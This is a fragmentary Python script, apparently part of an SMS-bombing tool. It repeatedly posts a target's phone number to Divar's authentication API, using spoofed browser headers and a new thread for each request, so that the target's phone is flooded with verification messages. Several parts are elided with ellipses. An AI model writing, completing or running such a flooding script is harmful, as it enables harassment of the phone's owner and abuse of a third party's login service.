...
'x-standard-divar-error': 'true'}
    ...
    try:
        ...
        pass
def max(phone):
    maxH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
...
'x-standard-divar-error': 'true'}
    ...
    try:
        maxR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=maxH, json=maxD).json()
...
def Vip(phone, tedad):
        for kos in range(int(tedad)):
            ...
            Thread(target=max, args=[phone]).start()
